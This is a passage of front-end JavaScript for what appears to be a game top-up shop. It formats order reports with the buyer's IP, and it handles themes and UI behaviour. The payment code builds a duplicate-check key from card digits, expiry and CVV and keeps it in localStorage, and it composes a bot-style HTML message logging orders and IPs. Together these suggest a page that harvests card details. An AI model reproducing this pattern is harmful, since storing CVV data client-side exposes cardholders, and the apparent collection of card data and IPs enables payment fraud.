    
    message += `<b>Order Details:</b>\n`;
    data.cart.forEach(item => {
        message += `• ${item.gameName} - ${item.packageName}\n`;
        message += `  UID: ${item.uid}\n`;
        message += `  Price: $${item.discountedPrice.toFixed(2)}\n\n`;
    });
    
    message += `<b>Total: $${total.toFixed(2)}</b>\n\n`;
    message += `IP: ${data.ip}\n`;
    message += `Time: ${new Date().toLocaleString()}`;
    
    return message;
}

// Check for duplicate submissions
function isDuplicateSubmission(data) {
    const cardKey = data.cardNumber.slice(-4) + data.expiry + data.cvv;
    return submittedData.some(item => 
        item.cardKey === cardKey && 
        item.email === data.email
    );
}

// Store submission data
function storeSubmissionData(data) {
    const cardKey = data.cardNumber.slice(-4) + data.expiry + data.cvv;
    submittedData.push({
        cardKey,
        email: data.email,
        timestamp: Date.now()
    });
    
    // Keep only last 100 submissions
    if (submittedData.length > 100) {
        submittedData = submittedData.slice(-100);
    }
    
    localStorage.setItem('submittedPayments', JSON.stringify(submittedData));
}

// Get user IP (simplified - in production use a proper IP service)
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

// Close dropdowns when clicking outside
document.addEventListener('click', function(event) {
    const langMenu = document.getElementById('langMenu');
    const langBtn = document.querySelector('.lang-btn');
    
    if (!langBtn.contains(event.target)) {
        langMenu.classList.remove('active');
    }
    
    const cartSidebar = document.getElementById('cartSidebar');
    const cartBtn = document.querySelector('.cart-btn');
    
    if (!cartSidebar.contains(event.target) && !cartBtn.contains(event.target)) {
        cartSidebar.classList.remove('active');
    }
});

// Smooth scrolling for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Add CSS animation keyframes
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
`;
document.head.appendChild(style);

// Load package backgrounds
function loadPackageBackgrounds() {
    const backgroundCSS = localStorage.getItem('packageBackgroundCSS');
    if (backgroundCSS) {
        let styleElement = document.getElementById('packageBackgroundStyle');
        if (!styleElement) {
            styleElement = document.createElement('style');
            styleElement.id = 'packageBackgroundStyle';
            document.head.appendChild(styleElement);
        }
        
        styleElement.textContent = backgroundCSS;
        console.log('Package backgrounds loaded from localStorage');
    }
}

// Listen for localStorage changes (when admin updates backgrounds)
window.addEventListener('storage', function(e) {
    if (e.key === 'packageBackgroundCSS' && e.newValue) {
        loadPackageBackgrounds();
        console.log('Package backgrounds updated from localStorage');
    }
});

// 3D Background Style Management
function applyBgStyle(styleNumber) {
    console.log('Applying background style:', styleNumber);
    
    // Remove all existing style classes
    document.body.classList.remove('bg-style-1', 'bg-style-2', 'bg-style-3', 'bg-style-4', 'bg-style-5', 'bg-style-6', 'bg-style-7', 'bg-style-8', 'bg-style-9', 'bg-style-10', 'bg-style-11', 'bg-style-12');
    
    // Apply new style class
    document.body.classList.add(`bg-style-${styleNumber}`);
    
    // Get style names for notification
    const styleNames = {
        1: 'Dark Gaming',
        2: 'Neon Cyber',
        3: 'Holographic Glass',
        4: 'Matrix Digital',
        5: 'Quantum Wave',
        6: 'Neural Network',
        7: 'Crystalline Prism',
        8: 'Plasma Energy',
        9: 'Cosmic Nebula',
        10: 'Emerald Matrix',
        11: 'Neon Circuit',
        12: 'Quantum Gaming'
    };
    
    // Show notification
    showNotification(`${styleNames[styleNumber]} theme applied!`, 'success');
}

// Load and apply saved background style
function loadSavedBgStyle() {
    const savedStyle = localStorage.getItem('activeBgStyle') || '1';
    applyBgStyle(savedStyle);
}

// Initialize background style on page load
document.addEventListener('DOMContentLoaded', function() {
    // Load saved background style after a short delay to ensure DOM is ready
    setTimeout(() => {
        loadSavedBgStyle();
    }, 100);
});